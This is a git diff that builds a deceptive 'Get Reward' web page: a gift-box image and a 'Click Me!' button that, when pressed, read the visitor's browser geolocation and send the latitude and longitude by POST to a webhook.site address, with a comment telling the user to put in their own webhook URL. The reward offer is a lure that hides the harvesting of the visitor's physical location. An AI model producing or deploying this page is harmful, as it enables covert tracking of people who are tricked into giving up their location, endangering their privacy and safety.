@@ -1,3 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Get Reward</title>
+<style>
+  body {
+    text-align: center;
+    font-family: Arial, sans-serif;
+    margin-top: 50px;
+    background-color: #f8f8f8;
+  }
+  img {
+    width: 150px; /* Gift box size */
+    margin-bottom: 20px;
+  }
+  button {
+    padding: 12px 25px;
+    font-size: 18px;
+    background-color: #ff4d4d;
+    color: white;
+    border: none;
+    border-radius: 8px;
+    cursor: pointer;
+  }
+  button:hover {
+    background-color: #e63946;
+  }
+  h2 {
+    color: #333;
+  }
+</style>
+</head>
+<body>
+
+<!-- Gift Box Image -->
+<img src="https://static.vecteezy.com/system/resources/previews/036/278/027/non_2x/3d-gift-box-with-check-mark-icon-illustration-for-ui-ux-web-mobile-apps-social-media-ads-design-free-png.png" alt="Gift Box">
+
+<h2>Click Here to Get Reward</h2>
+
+<button onclick="getLocation()">Click Me!</button>
+
+<p id="location"></p>
+
 <script>
 function getLocation() {
   if (navigator.geolocation) {
@@ -13,7 +56,7 @@ function showPosition(position) {
   document.getElementById("location").innerHTML =
     "Latitude: " + lat + "<br>Longitude: " + lon;
 
-  // Replace with your own webhook.site URL here
+  // Replace this with YOUR webhook.site URL
   fetch("https://webhook.site/9ed1c789-439e-472d-ac6e-352935f51e13", {
     method: "POST",
     headers: { "Content-Type": "application/json" },
@@ -31,3 +74,6 @@ function showError(error) {
   alert("Error getting location: " + error.message);
 }
 </script>
+
+</body>
+</html>
